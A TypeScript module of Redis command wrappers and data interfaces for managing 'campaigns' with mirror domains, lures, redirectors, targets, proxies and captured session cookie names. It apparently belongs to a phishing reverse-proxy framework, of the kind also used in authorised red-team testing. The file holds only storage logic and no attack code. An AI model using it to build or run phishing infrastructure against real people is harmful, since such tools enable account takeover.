import { CommandParser } from '@redis/client'
import {
  campaignIndexKey,
  campaignKey,
  campaignLockKey,
  campaignMirrorDomainsKey,
  campaignSessionCookieNamesKey,
  lureIndexKey,
  proxyIndexKey,
  redirectorIndexKey,
  targetIndexKey,
} from '../../database.keys.js'

/**
 * Raw campaign data structure.
 *
 * @category Campaign
 * @internal
 */
export interface RawCampaign {
  campaign_id: string
  mirror_domain: string
  is_locked: boolean
  session_count: number
  message_count: number
  created_at: number
}

/**
 * Raw full campaign data structure.
 *
 * @category Campaign
 * @internal
 */
export interface RawFullCampaign extends RawCampaign {
  description: string
  crypt_secret: string
  upgrade_session_path: string
  session_cookie_name: string
  session_cookie_names: string[]
  session_expire: number
  new_session_expire: number
  message_expire: number
  proxy_count: number
  target_count: number
  redirector_count: number
  lure_count: number
}

/**
 * Redis Lua function definitions for campaign operations.
 *
 * @category Campaign
 * @internal
 */
export const campaignFunctions = {
  campaign: {
    create_campaign: {
      NUMBER_OF_KEYS: 4,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        mirrorDomain: string,
        description: string,
        cryptSecret: string,
        upgradeSessionPath: string,
        sessionCookieName: string,
        sessionExpire: number,
        newSessionExpire: number,
        messageExpire: number,
        createdAt: number
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignMirrorDomainsKey(prefix))
        parser.pushKey(campaignSessionCookieNamesKey(prefix))
        parser.pushKey(campaignIndexKey(prefix))

        parser.push(campaignId)
        parser.push(mirrorDomain)
        parser.push(description)
        parser.push(cryptSecret)
        parser.push(upgradeSessionPath)
        parser.push(sessionCookieName)
        parser.push(sessionExpire.toString())
        parser.push(newSessionExpire.toString())
        parser.push(messageExpire.toString())
        parser.push(createdAt.toString())
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_full_campaign: {
      NUMBER_OF_KEYS: 7,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignSessionCookieNamesKey(prefix))
        parser.pushKey(campaignLockKey(prefix, campaignId))
        parser.pushKey(proxyIndexKey(prefix, campaignId))
        parser.pushKey(targetIndexKey(prefix, campaignId))
        parser.pushKey(redirectorIndexKey(prefix, campaignId))
        parser.pushKey(lureIndexKey(prefix, campaignId))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    read_campaign_index: {
      NUMBER_OF_KEYS: 1,

      parseCommand(parser: CommandParser, prefix: string) {
        parser.pushKey(campaignIndexKey(prefix))
      },

      transformReply: undefined as unknown as () => unknown,
    },

    lock_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        lockSecret: string,
        lockTimeout: number
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))

        parser.push(lockSecret)
        parser.push(lockTimeout.toString())
      },

      transformReply: undefined as unknown as () => unknown,
    },

    unlock_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string, lockSecret: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))

        parser.push(lockSecret)
      },

      transformReply: undefined as unknown as () => unknown,
    },

    update_campaign: {
      NUMBER_OF_KEYS: 2,

      parseCommand(
        parser: CommandParser,
        prefix: string,
        campaignId: string,
        description: string,
        sessionExpire: number,
        newSessionExpire: number,
        messageExpire: number,
        lockSecret: string
      ) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))

        parser.push(description)
        parser.push(sessionExpire.toString())
        parser.push(newSessionExpire.toString())
        parser.push(messageExpire.toString())
        parser.push(lockSecret)
      },

      transformReply: undefined as unknown as () => unknown,
    },

    delete_campaign: {
      NUMBER_OF_KEYS: 9,

      parseCommand(parser: CommandParser, prefix: string, campaignId: string, lockSecret: string) {
        parser.pushKey(campaignKey(prefix, campaignId))
        parser.pushKey(campaignLockKey(prefix, campaignId))
        parser.pushKey(campaignMirrorDomainsKey(prefix))
        parser.pushKey(campaignSessionCookieNamesKey(prefix))
        parser.pushKey(campaignIndexKey(prefix))
        parser.pushKey(proxyIndexKey(prefix, campaignId))
        parser.pushKey(targetIndexKey(prefix, campaignId))
        parser.pushKey(redirectorIndexKey(prefix, campaignId))
        parser.pushKey(lureIndexKey(prefix, campaignId))

        parser.push(lockSecret)
      },

      transformReply: undefined as unknown as () => unknown,
    },
  },
} as const
